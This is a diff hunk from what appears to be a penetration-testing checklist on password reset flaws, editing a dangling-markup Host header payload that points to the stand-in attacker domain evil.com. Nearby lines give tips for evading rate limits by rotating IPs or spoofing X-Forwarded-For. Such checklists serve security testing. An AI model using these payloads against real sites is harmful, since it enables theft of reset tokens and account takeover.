@@ -38,7 +38,7 @@
 	- Bypass rate limit protection: You can use IP-Rotate burp extension or you can change system IP per request.
 	
 	- Password reset poisoning via dangling markup
-		Host: victim.com:'<a href="//evil.com/? 
+		Host: victim.com:'<a href="//evil.com/? Don't ">
 
 	- Add X-Forwarded-For: 127.0.0.1 or 1-1000 to bypass the rate limit protection.
 
